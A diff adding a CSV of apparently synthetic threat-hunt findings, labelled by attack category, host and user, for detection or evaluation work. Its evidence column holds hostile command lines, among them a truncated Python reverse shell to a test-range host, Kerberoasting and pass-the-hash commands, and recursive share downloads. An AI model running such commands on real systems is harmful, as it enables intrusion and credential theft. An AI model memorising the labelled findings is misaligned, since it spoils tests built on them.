@@ -1,0 +1,139 @@
+category,timestamp,host,user,process,hunt,evidence
+Credential abuse,2026-10-15T17:11:57.999Z,WS-1514,frank58,sso,1,['15 SSO fails from 198.18.91.1 then success at 2026-10-15T17:41:52.752Z']
+Credential abuse,2026-10-13T05:43:22.854Z,WS-2313,yvonne88,sso,1,['24 SSO fails from 198.18.91.10 then success at 2026-10-13T06:13:22.187Z']
+Credential abuse,2026-10-13T07:16:46.325Z,WS-5084,nina195,sso,1,['22 SSO fails from 198.18.91.2 then success at 2026-10-13T07:46:44.916Z']
+Credential abuse,2026-10-16T11:11:17.941Z,WS-1154,jack44,sso,1,['27 SSO fails from 198.18.91.3 then success at 2026-10-16T11:41:13.537Z']
+Credential abuse,2026-10-14T13:21:21.690Z,WS-3823,alice147,sso,1,['14 SSO fails from 198.18.91.4 then success at 2026-10-14T13:51:19.526Z']
+Credential abuse,2026-10-16T10:49:43.605Z,WS-4352,jack167,sso,1,['26 SSO fails from 198.18.91.5 then success at 2026-10-16T11:19:39.294Z']
+Credential abuse,2026-10-14T19:26:21.568Z,WS-0824,rachel31,sso,1,['14 SSO fails from 198.18.91.6 then success at 2026-10-14T19:56:19.476Z']
+Credential abuse,2026-10-15T17:52:24.672Z,WS-9117,quinn350,sso,1,['13 SSO fails from 198.18.91.7 then success at 2026-10-15T18:22:16.575Z']
+Credential abuse,2026-10-14T14:20:19.115Z,WS-4227,omar162,sso,1,['13 SSO fails from 198.18.91.8 then success at 2026-10-14T14:50:15.985Z']
+Credential abuse,2026-10-15T04:37:00.500Z,WS-8271,carol318,sso,1,['18 SSO fails from 198.18.91.9 then success at 2026-10-15T05:06:52.521Z']
+Credential abuse,2026-10-13T01:23:43.095Z,WS-3098,dave119,sso,2,"['spray from 198.18.77.9: 24 users failed, then dave119 got in at 2026-10-13T02:03:00.836Z']"
+Credential abuse,2026-10-13T11:28:13.982Z,WS-5436,bob209,sso,2,"['spray from 198.18.77.9: 16 users failed, then bob209 got in at 2026-10-13T12:06:02.270Z']"
+Credential abuse,2026-10-14T05:18:19.192Z,WS-9364,dave360,sso,2,"['spray from 198.18.77.9: 20 users failed, then dave360 got in at 2026-10-14T05:42:36.582Z']"
+Credential abuse,2026-10-14T14:40:20.943Z,WS-1208,leo46,sso,2,"['spray from 198.18.77.9: 12 users failed, then leo46 got in at 2026-10-14T15:04:50.019Z']"
+Credential abuse,2026-10-14T15:44:13.768Z,WS-0090,leo3,sso,2,"['spray from 198.18.77.9: 26 users failed, then leo3 got in at 2026-10-14T16:21:48.973Z']"
+Credential abuse,2026-10-14T19:28:20.420Z,WS-3330,bob128,sso,2,"['spray from 198.18.77.9: 15 users failed, then bob128 got in at 2026-10-14T20:03:18.549Z']"
+Credential abuse,2026-10-15T04:35:13.649Z,WS-5444,jack209,sso,2,"['spray from 198.18.77.9: 30 users failed, then jack209 got in at 2026-10-15T05:14:05.995Z']"
+Credential abuse,2026-10-15T09:47:41.325Z,WS-8770,henry337,sso,2,"['spray from 198.18.77.9: 21 users failed, then henry337 got in at 2026-10-15T10:23:51.647Z']"
+Credential abuse,2026-10-15T22:47:19.915Z,WS-4590,nina176,sso,2,"['spray from 198.18.77.9: 34 users failed, then nina176 got in at 2026-10-15T23:27:08.358Z']"
+Credential abuse,2026-10-16T07:52:04.019Z,WS-0436,tina16,sso,2,"['spray from 198.18.77.9: 25 users failed, then tina16 got in at 2026-10-16T08:30:46.968Z']"
+Credential abuse,2026-10-12T01:55:37.897Z,WS-2143,karen82,bash,3,['ssh admin-5@10.2.0.61']
+Credential abuse,2026-10-13T02:03:07.507Z,WS-4997,erin192,bash,3,['ssh svc-backup@10.2.0.17']
+Credential abuse,2026-10-13T02:03:22.140Z,WS-0404,nina15,bash,3,['ssh svc-backup@10.2.0.23']
+Credential abuse,2026-10-13T02:05:30.865Z,WS-8690,frank334,bash,3,['ssh svc-backup@10.2.0.50']
+Credential abuse,2026-10-13T02:06:17.549Z,WS-0738,jack28,bash,3,['ssh svc-scan@10.2.0.44']
+Credential abuse,2026-10-13T03:52:51.944Z,WS-8951,grace344,bash,3,['ssh admin-4@10.2.0.47']
+Credential abuse,2026-10-14T02:31:18.085Z,WS-0107,carol4,bash,3,['ssh admin-2@10.2.0.19']
+Credential abuse,2026-10-14T03:05:34.321Z,WS-4246,henry163,bash,3,['ssh svc-monitor@10.2.0.26']
+Credential abuse,2026-10-14T03:06:00.092Z,WS-4683,carol180,bash,3,['ssh svc-monitor@10.2.0.32']
+Credential abuse,2026-10-14T03:06:58.020Z,WS-7655,karen294,bash,3,['ssh svc-monitor@10.2.0.59']
+Credential abuse,2026-10-14T04:26:35.755Z,WS-4150,paula159,bash,3,['ssh admin-3@10.2.0.29']
+Credential abuse,2026-10-15T02:56:48.326Z,WS-3983,erin153,bash,3,['ssh admin-2@10.2.0.15']
+Credential abuse,2026-10-15T04:05:43.212Z,WS-4474,bob172,bash,3,['ssh svc-scan@10.2.0.41']
+Credential abuse,2026-10-15T04:08:33.721Z,WS-3382,bob130,bash,3,['ssh svc-backup@10.2.0.35']
+Credential abuse,2026-10-15T04:09:43.553Z,WS-5599,irene215,bash,3,['ssh svc-scan@10.2.0.68']
+Credential abuse,2026-10-16T03:24:37.694Z,WS-7132,henry274,bash,3,['ssh admin-3@10.2.0.33']
+Credential abuse,2026-10-13T03:26:53.744Z,WS-0166,jack6,kerberos,4,['16 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-13T03:26:48.744Z']
+Credential abuse,2026-10-13T12:32:05.891Z,WS-8838,xavier339,kerberos,4,['16 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-13T12:32:00.480Z']
+Credential abuse,2026-10-13T12:57:25.113Z,WS-4184,xavier160,kerberos,4,['10 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-13T12:57:19.760Z']
+Credential abuse,2026-10-14T05:50:43.342Z,WS-6920,dave266,kerberos,4,['10 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-14T05:50:37.993Z']
+Credential abuse,2026-10-14T06:48:51.520Z,WS-5805,grace223,kerberos,4,['12 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-14T06:48:46.394Z']
+Credential abuse,2026-10-14T10:41:59.691Z,WS-1647,irene63,kerberos,4,['12 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-14T10:41:54.482Z']
+Credential abuse,2026-10-14T20:23:19.007Z,WS-4538,nina174,kerberos,4,['8 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-14T20:23:13.589Z']
+Credential abuse,2026-10-15T06:14:48.749Z,WS-5491,erin211,kerberos,4,['12 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-15T06:14:43.744Z']
+Credential abuse,2026-10-15T16:06:51.120Z,WS-9314,frank358,kerberos,4,['14 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-15T16:06:45.691Z']
+Credential abuse,2026-10-16T02:11:53.718Z,WS-4445,yvonne170,kerberos,4,['16 service tickets after `python3 /tmp/tgs.py --spns all --etype rc4 --out /tmp/hashes.txt` at 2026-10-16T02:11:48.427Z']
+Reconnaissance,2026-10-14T05:26:05.334Z,WS-1992,paula76,kerberos,5,['22 unknown accounts tried from 10.1.7.199']
+Reconnaissance,2026-10-14T05:29:43.911Z,WS-4363,uma167,kerberos,5,['24 unknown accounts tried from 10.1.17.10']
+Reconnaissance,2026-10-16T04:05:58.094Z,WS-0390,zack14,kerberos,5,['19 unknown accounts tried from 10.3.0.73']
+Reconnaissance,2026-10-13T01:20:22.970Z,WS-5696,bob219,ldapsearch,6,['33 wildcard LDAP searches']
+Reconnaissance,2026-10-13T04:06:14.815Z,WS-4925,karen189,ldapsearch,6,['26 wildcard LDAP searches']
+Reconnaissance,2026-10-13T20:52:10.161Z,WS-4475,carol172,ldapsearch,6,['30 wildcard LDAP searches']
+Reconnaissance,2026-10-14T22:13:05.517Z,WS-1887,omar72,ldapsearch,6,['31 wildcard LDAP searches']
+Reconnaissance,2026-10-15T03:35:35.425Z,WS-8794,frank338,ldapsearch,6,['31 wildcard LDAP searches']
+Reconnaissance,2026-10-15T14:54:26.358Z,WS-0283,wendy10,ldapsearch,6,['16 wildcard LDAP searches']
+Reconnaissance,2026-10-15T16:08:43.889Z,WS-6974,frank268,ldapsearch,6,['22 wildcard LDAP searches']
+Reconnaissance,2026-10-16T08:58:38.247Z,WS-1662,xavier63,ldapsearch,6,['29 wildcard LDAP searches']
+Reconnaissance,2026-10-13T04:31:53.050Z,WS-9637,quinn370,masscan,7,['24 server ip:port pairs probed by masscan']
+Reconnaissance,2026-10-14T00:02:53.678Z,WS-9056,henry348,python3,7,['10 server ip:port pairs probed by python3']
+Reconnaissance,2026-10-14T05:15:28.899Z,WS-3074,frank118,python3,7,['10 server ip:port pairs probed by python3']
+Reconnaissance,2026-10-14T06:57:10.171Z,WS-2504,henry96,masscan,7,['17 server ip:port pairs probed by masscan']
+Reconnaissance,2026-10-14T10:18:48.262Z,WS-5464,dave210,python3,7,['10 server ip:port pairs probed by python3']
+Reconnaissance,2026-10-14T10:46:09.011Z,WS-9063,omar348,python3,7,['10 server ip:port pairs probed by python3']
+Reconnaissance,2026-10-14T14:01:35.728Z,WS-5615,yvonne215,masscan,7,['26 server ip:port pairs probed by masscan']
+Reconnaissance,2026-10-14T14:04:58.271Z,WS-0159,carol6,python3,7,['10 server ip:port pairs probed by python3']
+Command and control,2026-10-12T15:30:33.410Z,WS-7030,jack270,sync_helper,8,['8 threat-intel-block denials 10.1.27.117 -> 198.18.70.10']
+Command and control,2026-10-13T07:25:12.775Z,WS-5626,jack216,sync_helper,8,['8 threat-intel-block denials 10.1.21.249 -> 198.18.70.9']
+Command and control,2026-10-13T11:56:37.701Z,WS-9650,dave371,sync_helper,8,['8 threat-intel-block denials 10.1.37.177 -> 198.18.70.4']
+Command and control,2026-10-13T13:01:11.739Z,WS-1438,henry55,sync_helper,8,['8 threat-intel-block denials 10.1.5.157 -> 198.18.70.4']
+Command and control,2026-10-13T13:46:53.276Z,WS-8355,irene321,sync_helper,8,['8 threat-intel-block denials 10.1.32.162 -> 198.18.70.13']
+Command and control,2026-10-13T14:24:20.808Z,WS-2204,tina84,sync_helper,8,['8 threat-intel-block denials 10.1.8.155 -> 198.18.70.7']
+Command and control,2026-10-14T05:34:07.350Z,WS-5265,mia202,sync_helper,8,['8 threat-intel-block denials 10.1.20.144 -> 198.18.70.6']
+Command and control,2026-10-14T12:48:36.742Z,WS-7525,karen289,sync_helper,8,['8 threat-intel-block denials 10.1.29.100 -> 198.18.70.4']
+Command and control,2026-10-14T16:58:24.865Z,WS-5182,henry199,sync_helper,8,['8 threat-intel-block denials 10.1.20.61 -> 198.18.70.4']
+Command and control,2026-10-15T09:24:08.186Z,WS-1953,carol75,sync_helper,8,['8 threat-intel-block denials 10.4.1.109 -> 198.18.70.8']
+Command and control,2026-10-15T17:53:28.536Z,WS-6484,jack249,sync_helper,8,['8 threat-intel-block denials 10.3.4.139 -> 198.18.70.11']
+Command and control,2026-10-16T02:32:17.824Z,WS-7105,grace273,sync_helper,8,['8 threat-intel-block denials 10.1.27.192 -> 198.18.70.12']
+Command and control,2026-10-16T02:16:26.308Z,WS-9116,paula350,bash,9,"['python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((""198.18.9.13"",4444));os.dup2(s.fileno(),0);os.dup2(']"
+Data theft,2026-10-12T02:32:27.081Z,WS-6458,jack248,vpn,10,['VPN from 203.0.113.197: 1.60 GB up vs 0.35 GB down']
+Data theft,2026-10-13T01:30:30.804Z,WS-0127,wendy4,vpn,10,['VPN from 203.0.113.180: 2.16 GB up vs 0.13 GB down']
+Data theft,2026-10-13T04:33:03.030Z,WS-5120,xavier196,vpn,10,['VPN from 203.0.113.188: 2.37 GB up vs 0.18 GB down']
+Data theft,2026-10-14T00:38:11.597Z,WS-5025,grace193,vpn,10,['VPN from 203.0.113.19: 1.98 GB up vs 0.23 GB down']
+Data theft,2026-10-15T02:37:57.401Z,WS-8952,henry344,vpn,10,['VPN from 203.0.113.78: 0.41 GB up vs 0.09 GB down']
+Data theft,2026-10-15T04:08:21.433Z,WS-2727,wendy104,vpn,10,['VPN from 203.0.113.180: 1.38 GB up vs 0.36 GB down']
+Data theft,2026-10-16T00:39:16.601Z,WS-3022,frank116,vpn,10,['VPN from 203.0.113.149: 0.47 GB up vs 0.27 GB down']
+Data theft,2026-10-16T03:08:26.400Z,WS-2324,jack89,vpn,10,['VPN from 203.0.113.53: 1.73 GB up vs 0.32 GB down']
+Lateral movement,2026-10-12T12:44:01.713Z,WS-2877,quinn110,smbclient,11,"[""smbclient //10.2.0.20/share -U quinn110 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-13T08:30:54.645Z,WS-4527,carol174,smbclient,11,"[""smbclient //10.2.0.24/share -U carol174 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-13T09:59:35.825Z,WS-7276,victor279,smbclient,11,"[""smbclient //10.2.0.16/share -U victor279 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-13T11:22:41.359Z,WS-5184,jack199,smbclient,11,"[""smbclient //10.2.0.18/share -U jack199 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-13T22:58:03.580Z,WS-1746,dave67,smbclient,11,"[""smbclient //10.2.0.26/share -U dave67 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-15T05:21:46.942Z,WS-9004,henry346,smbclient,11,"[""smbclient //10.2.0.14/share -U henry346 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-15T10:44:36.231Z,WS-7054,henry271,smbclient,11,"[""smbclient //10.2.0.30/share -U henry271 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-15T23:28:34.118Z,WS-5164,paula198,smbclient,11,"[""smbclient //10.2.0.22/share -U paula198 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-16T05:09:38.953Z,WS-2089,irene80,smbclient,11,"[""smbclient //10.2.0.28/share -U irene80 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-16T05:53:33.616Z,WS-3839,quinn147,smbclient,11,"[""smbclient //10.2.0.12/share -U quinn147 -c 'recurse; prompt; mget *'""]"
+Lateral movement,2026-10-13T02:29:06.957Z,WS-6288,victor241,wmic,11,"['wmic /node:10.2.0.29 /user:admin-2 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-13T21:27:00.601Z,WS-5967,mia229,wmic,11,"['wmic /node:10.2.0.21 /user:admin-2 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-14T05:25:28.347Z,WS-6939,wendy266,wmic,11,"['wmic /node:10.2.0.46 /user:admin-3 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-14T13:53:09.420Z,WS-1819,yvonne69,wmic,11,"['wmic /node:10.2.0.12 /user:admin-5 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-15T15:14:18.418Z,WS-1919,uma73,wmic,11,"['wmic /node:10.2.0.38 /user:admin-3 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-15T22:30:01.653Z,WS-3492,henry134,wmic,11,"['wmic /node:10.2.0.55 /user:admin-4 process call create ""powershell -nop -w hidden -c whoami""']"
+Lateral movement,2026-10-12T13:33:03.127Z,WS-0170,nina6,winrs,11,['winrs -r:10.2.0.53 -u:admin-4 whoami']
+Lateral movement,2026-10-13T14:34:04.181Z,WS-3918,rachel150,winrs,11,['winrs -r:10.2.0.65 -u:admin-5 whoami']
+Lateral movement,2026-10-14T13:37:48.893Z,WS-3014,xavier115,winrs,11,['winrs -r:10.2.0.17 -u:admin-4 whoami']
+Lateral movement,2026-10-14T15:38:58.916Z,WS-4882,tina187,winrs,11,['winrs -r:10.2.0.17 -u:admin-1 whoami']
+Lateral movement,2026-10-15T14:32:43.885Z,WS-5773,alice222,winrs,11,['winrs -r:10.2.0.29 -u:admin-5 whoami']
+Lateral movement,2026-10-16T15:35:30.530Z,WS-7910,frank304,winexe,11,['winexe -U admin-1%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //10.2.0.41 cmd']
+Lateral movement,2026-10-13T14:32:51.097Z,WS-7986,dave307,bash,11,['ssh -o StrictHostKeyChecking=no admin-1@10.2.0.13']
+Lateral movement,2026-10-14T09:18:38.312Z,WS-6342,xavier243,bash,11,['ssh -o StrictHostKeyChecking=no admin-3@10.2.0.23']
+Lateral movement,2026-10-15T14:26:54.984Z,WS-3055,mia117,bash,11,['ssh -o StrictHostKeyChecking=no admin-2@10.2.0.18']
+Lateral movement,2026-10-15T16:07:27.393Z,WS-7716,tina296,bash,11,['ssh -o StrictHostKeyChecking=no admin-5@10.2.0.31']
+Lateral movement,2026-10-13T10:31:17.488Z,WS-6312,tina242,xfreerdp,11,"['xfreerdp /u:admin-1 /v:10.2.0.15 +clipboard (rdp sign-in as admin-1, no MFA)']"
+Lateral movement,2026-10-13T14:32:03.693Z,WS-3890,paula149,xfreerdp,11,"['xfreerdp /u:admin-2 /v:10.2.0.39 +clipboard (rdp sign-in as admin-2, no MFA)']"
+Lateral movement,2026-10-13T18:38:32.203Z,WS-3054,leo117,xfreerdp,11,"['xfreerdp /u:admin-3 /v:10.2.0.63 +clipboard (rdp sign-in as admin-3, no MFA)']"
+Lateral movement,2026-10-14T11:38:41.062Z,WS-8498,victor326,xfreerdp,11,"['xfreerdp /u:admin-2 /v:10.2.0.21 +clipboard (rdp sign-in as admin-2, no MFA)']"
+Lateral movement,2026-10-14T15:39:20.790Z,WS-8664,frank333,xfreerdp,11,"['xfreerdp /u:admin-3 /v:10.2.0.45 +clipboard (rdp sign-in as admin-3, no MFA)']"
+Lateral movement,2026-10-14T19:37:08.051Z,WS-9403,quinn361,xfreerdp,11,"['xfreerdp /u:admin-1 /v:10.2.0.69 +clipboard (rdp sign-in as admin-1, no MFA)']"
+Lateral movement,2026-10-15T12:32:44.631Z,WS-8033,yvonne308,xfreerdp,11,"['xfreerdp /u:admin-3 /v:10.2.0.27 +clipboard (rdp sign-in as admin-3, no MFA)']"
+Lateral movement,2026-10-15T16:32:11.643Z,WS-5127,erin197,xfreerdp,11,"['xfreerdp /u:admin-1 /v:10.2.0.51 +clipboard (rdp sign-in as admin-1, no MFA)']"
+Lateral movement,2026-10-16T13:30:31.733Z,WS-0840,henry32,xfreerdp,11,"['xfreerdp /u:admin-1 /v:10.2.0.33 +clipboard (rdp sign-in as admin-1, no MFA)']"
+Lateral movement,2026-10-16T17:36:26.361Z,WS-7228,zack277,xfreerdp,11,"['xfreerdp /u:admin-2 /v:10.2.0.57 +clipboard (rdp sign-in as admin-2, no MFA)']"
+Malware delivery,2026-10-12T16:36:50.362Z,WS-0512,rachel19,updater,12,['updates.nexusos-patch.com/v2/manifest (48 requests; files: /v2/manifest)']
+Malware delivery,2026-10-12T22:34:37.776Z,WS-9604,jack369,chrome,12,['dl.freewarevault.net/files/doc.scr (2 requests; files: /files/doc.scr)']
+Malware delivery,2026-10-13T01:57:13.931Z,WS-3764,tina144,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-13T04:25:27.525Z,WS-1244,victor47,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-13T07:38:33.173Z,WS-4190,dave161,updater,12,['updates.nexusos-patch.com/v2/manifest (49 requests; files: /v2/manifest)']
+Malware delivery,2026-10-13T10:31:36.820Z,LAB-02,labuser4,chrome,12,['updates.driversoft-portal.net/files/patch.hta (2 requests; files: /files/patch.hta)']
+Malware delivery,2026-10-13T14:29:23.758Z,WS-7203,alice277,updater,12,['updates.nexusos-patch.com/v2/manifest (48 requests; files: /v2/manifest)']
+Malware delivery,2026-10-13T15:56:17.211Z,WS-9503,mia365,firefox,12,['dl.freewarevault.net/files/patch.hta (2 requests; files: /files/patch.hta)']
+Malware delivery,2026-10-14T02:39:45.602Z,WS-2938,zack112,chrome,12,['files.freevault-downloads.net/files/setup.exe (2 requests; files: /files/setup.exe)']
+Malware delivery,2026-10-14T03:57:24.822Z,WS-9398,leo361,chrome,12,['get.crackarchive.net/files/update.dll (2 requests; files: /files/update.dll)']
+Malware delivery,2026-10-15T13:47:42.026Z,WS-3032,paula116,firefox,12,['dl.freewarevault.net/files/patch.hta (2 requests; files: /files/patch.hta)']
+Malware delivery,2026-10-15T20:47:54.895Z,WS-9152,zack351,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-15T21:48:40.542Z,WS-3688,victor141,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-15T22:50:39.233Z,WS-5830,frank224,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-15T23:17:29.332Z,WS-7676,frank295,chrome,12,"['cdn.installer-bundle.net/dl/loader.exe (2 requests; files: /dl/loader.exe,/dl/stage2.dll)']"
+Malware delivery,2026-10-16T11:28:01.033Z,WS-6411,omar246,firefox,12,['get.crackarchive.net/files/update.dll (2 requests; files: /files/update.dll)']
